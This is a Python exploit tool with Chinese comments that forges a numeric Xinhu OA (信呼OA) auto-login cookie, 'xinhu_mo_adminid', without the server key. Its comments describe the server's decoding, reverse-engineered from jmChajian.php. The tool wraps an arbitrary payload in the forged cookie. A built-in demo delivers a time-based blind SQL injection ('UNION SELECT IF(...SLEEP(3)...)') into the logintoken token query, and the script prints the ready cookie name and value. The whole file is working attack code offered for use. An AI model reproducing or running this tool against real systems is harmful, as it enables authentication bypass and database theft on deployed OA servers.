#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
信呼OA 自动登录Cookie 伪造器（无密钥）

将任意payload编码为纯数字Cookie(xinhu_mo_adminid用), 不需要知道目标randkey。

编码原理(逆向自 include/chajian/jmChajian.php):
  服务端解码: Cookie按'0'切段 -> 每段转整数 -> chr(整数 % 256) -> 拼接
             -> 变形base64(还原!→+ .→/ :→=) -> base64解码 -> 得到明文
  伪造: 对明文base64后的每个字符c, 找一个十进制不含'0'的数v,
        满足 v % 256 == ord(c)。若ord(c)本身含'0', 加256重试(101->357)。

用法:
  python3 forge.py "zz' UNION SELECT IF((1=1),SLEEP(3),0),'a',9,1#"
  python3 forge.py "payload..." --show     # 显示逐字符计算过程
  python3 forge.py --demo                  # 内置SLEEP示例完整演示
"""
import argparse
import base64
import re


def seg_for(ch):
    """字符c -> 十进制不含'0'且模256等于ord(c)的编码段"""
    o, k = ord(ch), 0
    while True:
        v = o + 256 * k
        if '0' not in str(v):
            return str(v)
        k += 1


def b64_variant(plain):
    """明文 -> jm变形base64(+→! /→. =→:)"""
    b = base64.b64encode(plain.encode()).decode()
    return b.replace('+', '!').replace('/', '.').replace('=', ':')


def forge(plain):
    """任意payload -> 纯数字Cookie"""
    return '0'.join(seg_for(c) for c in b64_variant(plain)) + '05'


def unforge(cookie):
    """还原(自检用): 模拟服务端解码"""
    segs = cookie.split('0')
    mid = ''.join(chr(int(s) % 256) for s in segs[:-1])
    std = mid.replace('!', '+').replace('.', '/').replace(':', '=')
    return base64.b64decode(std).decode()


def show_table(plain):
    print('[1] payload经变形base64后需要编码的字符流:')
    vb = b64_variant(plain)
    print('   ', vb)
    print('\n[2] 逐字符计算编码段 (规则: 找不含0的数v, v % 256 == ord(c)):')
    print(f'    {"字符":^6} {"ord":>4}  {"ord含0?":^9}  {"+256k尝试":<18} 编码段')
    seen = {}
    for c in vb:
        if c in seen:
            continue
        o = ord(c)
        tries, k = [], 0
        while True:
            v = o + 256 * k
            tries.append(v)
            if '0' not in str(v):
                break
            k += 1
        seen[c] = True
        flag = '是' if '0' in str(o) else '否'
        path = ' -> '.join(str(t) for t in tries)
        mark = f'  (={o}+{256*k})' if k else '  (直接)'
        print(f'    {c!r:^6} {o:>4}  {flag:^9}  {path:<18} {v}{mark}')
    print(f'\n[3] 拼装: 所有段用"0"连接, 末尾加"0"+"5"(偏移量,纯数字段不使用)')


DEMO_SLEEP = "zz' UNION SELECT IF((1=1),SLEEP(3),0),'a',9,1#"

if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='信呼OA 自动登录Cookie伪造器(无密钥)')
    ap.add_argument('payload', nargs='?', help='要编码的payload明文')
    ap.add_argument('--show', action='store_true', help='显示逐字符计算过程')
    ap.add_argument('--demo', action='store_true', help='内置SLEEP示例完整演示')
    args = ap.parse_args()

    if args.demo:
        plain = DEMO_SLEEP
        print('=== demo: 时间盲注验证payload的Cookie伪造全过程 ===\n')
        print('[0] 目标SQL(服务端拼接结果):')
        print("    SELECT name,token,id,uid FROM [前缀]logintoken")
        print("     WHERE token='" + plain + "' LIMIT 1")
        print('    注入payload明文: ' + plain + '\n')
        show_table(plain)
    elif args.payload:
        plain = args.payload
        if args.show:
            show_table(plain)
    else:
        ap.print_help()
        raise SystemExit(1)

    cookie = forge(plain)
    print('\n[4] 伪造结果:')
    print('    Cookie名  : xinhu_mo_adminid (qom前缀见目标webmainConfig.php)')
    print('    Cookie值  : ' + cookie)
    print('    纯数字    :', cookie.isdigit(), ' 长度:', len(cookie))
    assert unforge(cookie) == plain
    print('    自检      : 服务端解码还原 == 原payload ✓')
